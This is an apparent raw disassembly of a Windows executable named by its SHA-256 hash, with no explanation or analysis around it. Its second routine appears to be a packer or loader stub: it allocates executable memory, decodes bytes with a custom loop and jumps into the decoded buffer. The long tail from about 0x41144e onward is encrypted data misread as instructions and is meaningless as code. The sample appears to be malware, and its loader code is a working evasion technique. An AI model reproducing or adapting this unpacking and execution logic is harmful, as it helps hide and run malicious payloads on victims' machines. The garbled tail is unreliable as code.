
6c24ab46ed119c6bfb3f3db3c9a1e9b37086c7a02d8b36f27f6270ebbc4c3aef.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e0
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291d8
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42900c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429028
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429040
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x429048
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429118
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a0
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429178
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429148
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429120
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x42920c
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429210
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x429214
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429218
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x4291fc
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429200
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x429204
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429208
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x42920a
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291e8
  4112d4:	call   DWORD PTR ds:0x429004
  4112da:	test   eax,eax
  4112dc:	je     0x411324
  4112de:	push   0x0
  4112e0:	push   0x0
  4112e2:	push   0x0
  4112e4:	call   DWORD PTR ds:0x429034
  4112ea:	mov    DWORD PTR [ebp-0x14],eax
  4112ed:	lea    ecx,[ebp-0x40]
  4112f0:	push   ecx
  4112f1:	lea    edx,[ebp-0x10]
  4112f4:	push   edx
  4112f5:	call   DWORD PTR ds:0x429000
  4112fb:	test   eax,eax
  4112fd:	je     0x411324
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	push   0x0
  411318:	push   0x0
  41131a:	mov    edx,DWORD PTR [ebp-0x14]
  41131d:	push   edx
  41131e:	call   DWORD PTR ds:0x42902c
  411324:	mov    BYTE PTR [ebp-0x40],0x56
  411328:	call   DWORD PTR ds:0x429044
  41132e:	mov    DWORD PTR [ebp-0x2c],eax
  411331:	mov    BYTE PTR [ebp-0x3e],0x72
  411335:	movzx  eax,WORD PTR [ebp-0x2c]
  411339:	cmp    eax,0x539
  41133e:	jne    0x411380
  411340:	mov    BYTE PTR [ebp-0x34],0x0
  411344:	mov    DWORD PTR [ebp-0x14],0xe0d
  41134b:	lea    ecx,[ebp-0x28]
  41134e:	push   ecx
  41134f:	call   DWORD PTR ds:0x429024
  411355:	mov    DWORD PTR [ebp-0x60],eax
  411358:	mov    DWORD PTR [ebp-0x54],0x3a
  41135f:	lea    edx,[ebp-0x40]
  411362:	push   edx
  411363:	mov    eax,DWORD PTR [ebp-0x60]
  411366:	push   eax
  411367:	call   DWORD PTR ds:0x429020
  41136d:	mov    DWORD PTR [ebp-0x44],eax
  411370:	mov    DWORD PTR [ebp-0x8],0x15a38389
  411377:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137e:	jmp    0x411395
  411380:	mov    BYTE PTR ds:0x444a58,0x0
  411387:	mov    BYTE PTR ds:0x42cb88,0x0
  41138e:	mov    BYTE PTR ds:0x442b18,0x0
  411395:	mov    DWORD PTR [ebp-0x2c],0x410000
  41139c:	push   DWORD PTR ds:0x429024
  4113a2:	pop    edx
  4113a3:	mov    DWORD PTR [ebp-0x6c],edx
  4113a6:	push   DWORD PTR [ebp-0x30]
  4113a9:	push   0x1000
  4113ae:	mov    eax,DWORD PTR [ebp-0x14]
  4113b1:	add    eax,0x23
  4113b4:	add    eax,0x23
  4113b7:	push   eax
  4113b8:	xor    eax,eax
  4113ba:	push   eax
  4113bb:	mov    ecx,DWORD PTR [ebp-0x44]
  4113be:	call   ecx
  4113c0:	push   eax
  4113c1:	pop    ecx
  4113c2:	mov    DWORD PTR [ebp-0x4],ecx
  4113c5:	mov    ecx,DWORD PTR [ebp-0x68]
  4113c8:	sub    ecx,0xdae0b
  4113ce:	mov    DWORD PTR [ebp-0x68],ecx
  4113d1:	cmp    DWORD PTR [ebp-0x4],0x0
  4113d5:	jne    0x4113de
  4113d7:	mov    BYTE PTR ds:0x442b18,0x0
  4113de:	mov    edx,DWORD PTR [ebp-0x4]
  4113e1:	add    edx,DWORD PTR [ebp-0x14]
  4113e4:	mov    eax,DWORD PTR [ebp-0x8]
  4113e7:	mov    DWORD PTR [edx],eax
  4113e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ec:	add    ecx,DWORD PTR [ebp-0x54]
  4113ef:	mov    DWORD PTR [ebp-0x5c],ecx
  4113f2:	mov    edx,DWORD PTR ds:0x429020
  4113f8:	mov    DWORD PTR [ebp-0x4c],edx
  4113fb:	mov    eax,DWORD PTR [ebp-0x4]
  4113fe:	add    eax,DWORD PTR [ebp-0x14]
  411401:	mov    ecx,DWORD PTR [ebp+0x8]
  411404:	mov    DWORD PTR [eax+0x4],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    DWORD PTR [ebp-0xc],edx
  411410:	cmp    DWORD PTR [ebp-0x68],0x0
  411414:	jbe    0x411431
  411416:	mov    eax,DWORD PTR [ebp-0xc]
  411419:	push   eax
  41141a:	mov    ecx,DWORD PTR [ebp-0x14]
  41141d:	push   ecx
  41141e:	mov    edx,DWORD PTR [ebp-0x2c]
  411421:	add    edx,DWORD PTR [ebp-0x68]
  411424:	push   edx
  411425:	mov    eax,DWORD PTR [ebp-0x4]
  411428:	push   eax
  411429:	call   0x411170
  41142e:	add    esp,0x10
  411431:	cmp    DWORD PTR [ebp-0x5c],0x0
  411435:	je     0x411448
  411437:	push   DWORD PTR [ebp-0x4c]
  41143a:	push   DWORD PTR [ebp-0x6c]
  41143d:	mov    edx,DWORD PTR [ebp-0x5c]
  411440:	push   eax
  411441:	jmp    edx
  411443:	jmp    0x422f1d
  411448:	mov    ecx,DWORD PTR [ebp+0x8]
  41144b:	mov    DWORD PTR [ebp-0x18],ecx
  41144e:	lahf   
  41144f:	xor    BYTE PTR [eax+0x6856185b],dl
  411455:	xchg   esp,eax
  411456:	inc    edx
  411457:	dec    eax
  411458:	xchg   esi,esp
  41145a:	pop    edi
  41145b:	sbb    al,bh
  41145d:	cdq    
  41145e:	mov    al,ds:0xf902c49
  411463:	push   0xdaed6742
  411468:	cmp    DWORD PTR [esi-0x124ed0bd],0xffffff8d
  41146f:	iret   
  411470:	adc    bh,ah
  411472:	jecxz  0x4114f0
  411474:	and    eax,0x8c6acf5c
  411479:	mov    ch,0xba
  41147b:	jmp    0x7f8e:0xca976fc8
  411482:	test   al,0x92
  411484:	and    ebx,eax
  411486:	mov    bh,0x4c
  411488:	xor    edi,DWORD PTR [edx-0x32]
  41148b:	jbe    0x411489
  41148d:	adc    dl,bh
  41148f:	mov    al,ds:0x46fb7052
  411494:	stos   DWORD PTR es:[edi],eax
  411495:	lods   al,BYTE PTR ds:[esi]
  411496:	js     0x411428
  411498:	je     0x411484
  41149a:	std    
  41149b:	add    BYTE PTR [edx+edi*1],dh
  41149e:	and    ebx,DWORD PTR ds:0xc83da5b8
  4114a4:	fidivr DWORD PTR [ebx-0x7c29ef9a]
  4114aa:	cli    
  4114ab:	clc    
  4114ac:	inc    eax
  4114ad:	not    ebx
  4114af:	and    al,0xd8
  4114b1:	nop
  4114b2:	cdq    
  4114b3:	loopne 0x411463
  4114b5:	or     BYTE PTR [edi],0x67
  4114b8:	enter  0x7a17,0x92
  4114bc:	pop    esi
  4114bd:	(bad)
  4114c1:	adc    ebp,ebx
  4114c3:	xor    eax,0x38b5355d
  4114c8:	add    eax,0x6d2c93a3
  4114cd:	stos   DWORD PTR es:[edi],eax
  4114ce:	mul    DWORD PTR [eax-0xbdb69f0]
  4114d4:	mov    bh,0xce
  4114d6:	sahf   
  4114d7:	test   DWORD PTR [eax],0x6fc536b8
  4114dd:	(bad)  
  4114de:	mov    DWORD PTR [eax-0x7fa15bf2],0x96de529f
  4114e8:	sub    edi,eax
  4114ea:	inc    BYTE PTR [bp-0x6116]
  4114ef:	sahf   
  4114f0:	mov    ecx,0x9d598809
  4114f5:	(bad)  
  4114f6:	or     dl,BYTE PTR ds:[ecx]
  4114f9:	cmp    esi,DWORD PTR [ecx+0x21ddbbc4]
  4114ff:	addr16 test al,0xba
  411502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411503:	mov    al,0xb9
  411505:	cmc    
  411506:	push   0x37
  411508:	fs daa 
  41150a:	out    0xd6,al
  41150c:	lods   al,BYTE PTR ds:[esi]
  41150d:	in     al,0x93
  41150f:	xchg   ebx,eax
  411510:	pop    ebp
  411511:	les    edi,FWORD PTR [ecx-0x58]
  411514:	(bad)  
  411516:	or     BYTE PTR [ebx+0x244c13e],0x22
  41151d:	mov    esi,gs
  41151f:	inc    edi
  411520:	inc    eax
  411521:	xchg   esi,eax
  411522:	and    ebp,ecx
  411524:	xor    eax,0xb05e32fc
  411529:	jne    0x4114f0
  41152b:	push   edx
  41152c:	mov    ah,0x50
  41152e:	mov    ebx,0x242d175f
  411533:	adc    BYTE PTR [edi],dh
  411535:	dec    ecx
  411536:	xchg   esi,eax
  411537:	in     eax,0x5c
  411539:	xor    ecx,ebp
  41153b:	fld    DWORD PTR [ecx+0x1c1beee1]
  411541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411542:	sahf   
  411543:	or     dh,0x73
  411546:	jmp    0xf9a9d0fb
  41154b:	xor    BYTE PTR [eax],cl
  41154d:	xchg   esp,eax
  41154e:	inc    BYTE PTR [edi-0x2]
  411551:	and    dh,BYTE PTR [ebx-0x4f02e178]
  411557:	cmp    ecx,edx
  411559:	xchg   ebx,eax
  41155a:	daa    
  41155b:	xchg   dh,ch
  41155d:	ss (bad) 
  41155f:	cmp    eax,DWORD PTR [esi+ebp*2+0x12656786]
  411566:	les    ebx,FWORD PTR [ecx]
  411568:	xchg   edx,eax
  411569:	add    DWORD PTR [edi-0x31],esi
  41156c:	push   DWORD PTR [edi+edi*2+0x11]
  411570:	pop    ebp
  411571:	inc    edi
  411572:	jle    0x4114fa
  411574:	scas   al,BYTE PTR es:[edi]
  411575:	outs   dx,DWORD PTR ds:[esi]
  411576:	pop    es
  411577:	dec    esi
  411578:	jg     0x41155f
  41157a:	test   DWORD PTR [ebx-0x66],edx
  41157d:	dec    eax
  41157e:	fild   DWORD PTR ds:0x5a30637b
  411584:	jno    0x411507
  411586:	ja     0x4115b3
  411588:	push   ds
  411589:	clc    
  41158a:	or     al,dh
  41158c:	lods   eax,DWORD PTR ds:[esi]
  41158d:	or     eax,0x5336929c
  411592:	push   ebp
  411593:	add    edi,edx
  411595:	aad    0x6
  411597:	fwait
  411598:	mov    esp,0x7a7ca9c4
  41159d:	jmp    0xabf2:0x450ffcd0
  4115a4:	call   0x84a1:0x16f9e333
  4115ab:	(bad)  
  4115ad:	add    bh,BYTE PTR [ebx+0x37c5e6e4]
  4115b3:	ins    BYTE PTR es:[edi],dx
  4115b4:	pop    eax
  4115b5:	dec    ebx
  4115b6:	mov    bl,0x85
  4115b8:	pop    ebx
  4115b9:	pop    edx
  4115ba:	mov    eax,0x9ed46eb2
  4115bf:	dec    ecx
  4115c0:	adc    dh,BYTE PTR [esp+ebp*1+0x21ee6d9b]
  4115c7:	in     al,dx
  4115c8:	idiv   BYTE PTR [esi-0x27]
  4115cb:	in     eax,dx
  4115cc:	jmp    0x4db515b7
  4115d1:	inc    eax
  4115d2:	loopne 0x4115a0
  4115d4:	(bad)  
  4115d5:	cld    
  4115d6:	call   0x27b75a0a
  4115db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115dc:	push   ds
  4115dd:	add    al,0x7d
  4115df:	sbb    esp,DWORD PTR [ecx]
  4115e1:	les    ebx,FWORD PTR [edx-0x1a23bd22]
  4115e7:	mov    WORD PTR [edx+0x7e593a6d],ss
  4115ed:	and    eax,0x7ebccadc
  4115f2:	jge    0x411603
  4115f4:	dec    esi
  4115f5:	mov    BYTE PTR [edx],al
  4115f7:	push   ss
  4115f8:	in     al,0x43
  4115fa:	hlt    
  4115fb:	push   ecx
  4115fc:	loope  0x4115f7
  4115fe:	les    edi,FWORD PTR [esi+0x42]
  411601:	push   ecx
  411602:	pop    ebp
  411603:	mov    bh,BYTE PTR [edx+0x373d0ebf]
  411609:	dec    ebx
  41160a:	inc    esi
  41160b:	idiv   DWORD PTR [esi+0x5f8dc969]
  411611:	fcmovnb st,st(3)
  411613:	dec    ecx
  411614:	ins    BYTE PTR es:[edi],dx
  411615:	push   edx
  411616:	dec    ebp
  411617:	shl    BYTE PTR [edx],1
  411619:	add    eax,0x7f60e907
  41161e:	out    dx,al
  41161f:	mov    bl,0xc3
  411621:	mov    ecx,DWORD PTR [ecx+ebp*4-0x77]
  411625:	push   ebx
  411626:	cli    
  411627:	lock jb 0x4116a1
  41162a:	mov    cl,0x43
  41162c:	nop
  41162d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41162e:	cmp    ecx,DWORD PTR [edx]
  411630:	jp     0x4115e7
  411632:	mov    ds:0x9e71034e,eax
  411637:	(bad)  
  411638:	retf   0x1dd2
  41163b:	pop    ebp
  41163c:	mov    es,WORD PTR [esi+0x1be97d4a]
  411642:	dec    ebx
  411643:	ss jns 0x41168f
  411646:	pop    ecx
  411647:	push   eax
  411648:	or     al,0x4b
  41164a:	xchg   ebx,eax
  41164b:	pop    edi
  41164c:	mov    esp,esp
  41164e:	aas    
  41164f:	aad    0xdd
  411651:	icebp  
  411652:	popf   
  411653:	and    esp,ebx
  411655:	inc    esi
  411656:	adc    ah,BYTE PTR [ecx]
  411658:	ror    BYTE PTR [ecx],1
  41165a:	in     eax,dx
  41165b:	push   edx
  41165c:	imul   BYTE PTR [edx-0x68]
  41165f:	push   esi
  411660:	ror    DWORD PTR [esi],cl
  411662:	mov    esp,0x7413ed20
  411667:	jmp    0x41166a
  411669:	imul   esp,DWORD PTR ds:0x4d3d2587,0x564e0fff
  411673:	jae    0x411630
  411675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411676:	mov    ah,cl
  411678:	mov    bh,0xd3
  41167a:	in     eax,dx
  41167b:	push   cs
  41167c:	pop    ss
  41167d:	xchg   edi,eax
  41167e:	call   0x83a1148e
  411683:	out    0xe8,al
  411685:	out    dx,eax
  411686:	mov    esp,0xc1dac519
  41168b:	mov    BYTE PTR [ebx-0x9],al
  41168e:	cld    
  41168f:	xor    DWORD PTR [ecx+0x54],eax
  411692:	adc    BYTE PTR [ecx],0xea
  411695:	ins    DWORD PTR es:[edi],dx
  411696:	in     al,dx
  411697:	sbb    cl,cl
  411699:	mov    ah,0x3f
  41169b:	aaa    
  41169c:	shr    esi,0xc1
  41169f:	(bad)  
  4116a1:	jmp    esi
  4116a3:	xchg   edx,eax
  4116a4:	in     eax,dx
  4116a5:	xor    DWORD PTR [edi+0x4d],0x4a
  4116a9:	daa    
  4116aa:	fwait
  4116ab:	add    al,0xe7
  4116ad:	loope  0x411708
  4116af:	dec    edi
  4116b0:	xchg   edx,eax
  4116b1:	sub    al,0xf0
  4116b3:	iret   
  4116b4:	cdq    
  4116b5:	das    
  4116b6:	clc    
  4116b7:	push   0x65
  4116b9:	sub    ecx,DWORD PTR [edi-0x2b]
  4116bc:	imul   ecx,DWORD PTR [edi+0x2b],0xffffffe6
  4116c0:	or     eax,0xa7ddf34e
  4116c5:	push   0x7927551a
  4116ca:	and    al,0x90
  4116cc:	imul   ebx,edi,0xb38069fd
  4116d2:	sbb    bh,BYTE PTR [eax-0x10]
  4116d5:	add    al,0x4f
  4116d7:	sbb    ah,dh
  4116d9:	push   eax
  4116da:	enter  0x9982,0xf
  4116de:	push   ss
  4116df:	jmp    0xd256ca7e
  4116e4:	ror    ebx,1
  4116e6:	dec    esi
  4116e7:	push   ds
  4116e8:	xchg   edi,eax
  4116e9:	inc    ecx
  4116ea:	add    DWORD PTR [esp+edx*8+0x18aef1f8],0xd6c3fba6
  4116f5:	mov    eax,esp
  4116f7:	mov    dh,0x5f
  4116f9:	sub    eax,DWORD PTR [ebx+0x74]
  4116fc:	in     eax,dx
  4116fd:	ret    
  4116fe:	lock sbb bl,cl
  411701:	mov    edx,0x665b8a35
  411706:	adc    ch,BYTE PTR [eax-0x17]
  411709:	lea    ebp,[eax-0x23]
  41170c:	mov    dh,0x72
  41170e:	ja     0x41173a
  411710:	sbb    esp,edi
  411712:	fmul   st(7),st
  411714:	call   0x16dd30c3
  411719:	or     dh,BYTE PTR [esi]
  41171b:	push   0x4698df09
  411720:	(bad)  
  411721:	pop    edi
  411722:	imul   ebp,ebx,0xffffffc7
  411725:	pop    edi
  411726:	jnp    0x4116c4
  411728:	test   BYTE PTR [eax+0x18],0xe0
  41172c:	jbe    0x4116f2
  41172e:	inc    esi
  41172f:	enter  0x5c4,0x18
  411733:	pop    esi
  411734:	dec    esp
  411735:	xor    BYTE PTR [ebx-0x69747b7a],dl
  41173b:	inc    ebp
  41173c:	aaa    
  41173d:	scas   al,BYTE PTR es:[edi]
  41173e:	out    0x2b,eax
  411740:	es push edi
  411742:	sbb    dl,BYTE PTR [eax+0x30]
  411745:	jo     0x411795
  411747:	cdq    
  411748:	fmul   st(7),st
  41174a:	jecxz  0x411775
  41174c:	jo     0x41171f
  41174e:	and    al,0x7e
  411750:	(bad)  
  411751:	pop    ebp
  411752:	jno    0x411790
  411754:	cld    
  411755:	pop    esp
  411756:	shl    ch,cl
  411758:	inc    esi
  411759:	arpl   WORD PTR [ebx+0x4e],bp
  41175c:	aaa    
  41175d:	mov    bh,0x51
  41175f:	jmp    0x4e02ec33
  411764:	loop   0x411710
  411766:	fisttp WORD PTR [edi+0x741cd96e]
  41176c:	in     eax,0x60
  41176e:	pop    es
  41176f:	mov    bh,0x46
  411771:	mov    ebx,DWORD PTR [edx+ebp*8]
  411774:	scas   eax,DWORD PTR es:[edi]
  411775:	mov    es,WORD PTR ds:0xd1ac3040
  41177b:	out    0xea,al
  41177d:	or     BYTE PTR [eax],0xdf
  411780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411781:	int    0xee
  411783:	arpl   WORD PTR [ecx-0x80],dx
  411786:	cdq    
  411787:	stos   BYTE PTR es:[edi],al
  411788:	mov    WORD PTR [eax],?
  41178a:	lock cdq 
  41178c:	or     dh,BYTE PTR [ebx-0x48de35b3]
  411792:	pop    esi
  411793:	adc    BYTE PTR [ebx],0x77
  411796:	dec    ebx
  411797:	mov    bh,0xfe
  411799:	clc    
  41179a:	sbb    al,0x95
  41179c:	fadd   QWORD PTR [esi+0x545f0075]
  4117a2:	mov    cs,WORD PTR [eax+ebp*2-0xb]
  4117a6:	add    al,0x63
  4117a8:	adc    DWORD PTR [edi+0x7f3a673],0x19f9bcec
  4117b2:	push   esi
  4117b3:	push   ds
  4117b4:	or     BYTE PTR [edi-0x47f318],bh
  4117ba:	daa    
  4117bb:	xor    DWORD PTR [ecx-0xfcb143c],0xffffffd6
  4117c2:	(bad)  
  4117c3:	mov    dl,0xc7
  4117c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117c6:	xor    dl,al
  4117c8:	popa   
  4117c9:	out    0x23,al
  4117cb:	mov    eax,0xd56d9be5
  4117d0:	jmp    0x4117a2
  4117d2:	je     0x411798
  4117d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d5:	cli    
  4117d6:	and    eax,0x475e9076
  4117db:	test   al,0xc7
  4117dd:	sub    al,BYTE PTR [edi]
  4117df:	leave  
  4117e0:	mov    ds:0x33ab28b7,al
  4117e5:	adc    al,0x6d
  4117e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e8:	and    bl,0xdb
  4117eb:	or     DWORD PTR [edx],esi
  4117ed:	push   0xeac92759
  4117f2:	jmp    0x297fb6e7
  4117f7:	xor    eax,0xb01a609d
  4117fc:	sbb    eax,0xa688e0a9
  411801:	mov    edi,0xbcf16005
  411806:	rcl    dl,cl
  411808:	mov    eax,cs:0x36f7179c
  41180e:	shr    BYTE PTR [ebx+0x4d6b8fef],1
  411814:	sub    BYTE PTR [ecx],dl
  411816:	cwde   
  411817:	pop    esi
  411818:	and    cl,BYTE PTR [ebx]
  41181a:	daa    
  41181b:	loop   0x4117a4
  41181d:	std    
  41181e:	aaa    
  41181f:	daa    
  411820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411821:	inc    ecx
  411822:	js     0x411808
  411824:	in     al,dx
  411825:	mov    cl,0x9f
  411827:	mov    dl,0x2f
  411829:	outs   dx,DWORD PTR ds:[esi]
  41182a:	fwait
  41182b:	adc    ecx,DWORD PTR [edx+0x54]
  41182e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41182f:	rcr    DWORD PTR [ebx],1
  411831:	adc    eax,0x965d78de
  411836:	xor    ch,BYTE PTR [edi-0x5c9ccdbf]
  41183c:	mov    ds:0x66b12170,eax
  411841:	sbb    BYTE PTR [esi],dl
  411843:	mov    ebp,0x8a542940
  411848:	push   ecx
  411849:	or     BYTE PTR [ecx+0x571c8577],cl
  41184f:	push   eax
  411850:	and    al,bh
  411852:	xchg   edi,eax
  411853:	and    BYTE PTR [ebp+0x6816ff1a],dh
  411859:	and    DWORD PTR [eax],ebx
  41185b:	xchg   DWORD PTR [edi+eax*4+0x12],edx
  41185f:	test   eax,0xe35198dd
  411864:	lods   al,BYTE PTR ds:[esi]
  411865:	jb     0x4118cf
  411867:	into   
  411868:	out    dx,eax
  411869:	arpl   WORD PTR [edi-0x73],ax
  41186c:	jmp    0x4ac3:0x596b7f6f
  411873:	mul    DWORD PTR [eiz*8-0x406703f0]
  41187a:	and    ebp,0xbf94f6a
  411880:	fidivr DWORD PTR [eax]
  411882:	jp     0x411867
  411884:	mov    bh,0x8f
  411886:	sar    DWORD PTR [ebp-0x79],1
  411889:	rcl    BYTE PTR [esp+edx*8+0x39],1
  41188d:	sub    al,0x78
  41188f:	xor    eax,0xbdf9d43f
  411894:	mov    ch,0x85
  411896:	js     0x411887
  411898:	xor    esi,edi
  41189a:	cwde   
  41189b:	adc    bh,BYTE PTR [ebp-0x4b]
  41189e:	out    dx,eax
  41189f:	jl     0x4118ae
  4118a1:	lds    edx,FWORD PTR [ebx]
  4118a3:	cld    
  4118a4:	ret    0xc81c
  4118a7:	push   ebx
  4118a8:	push   0x51
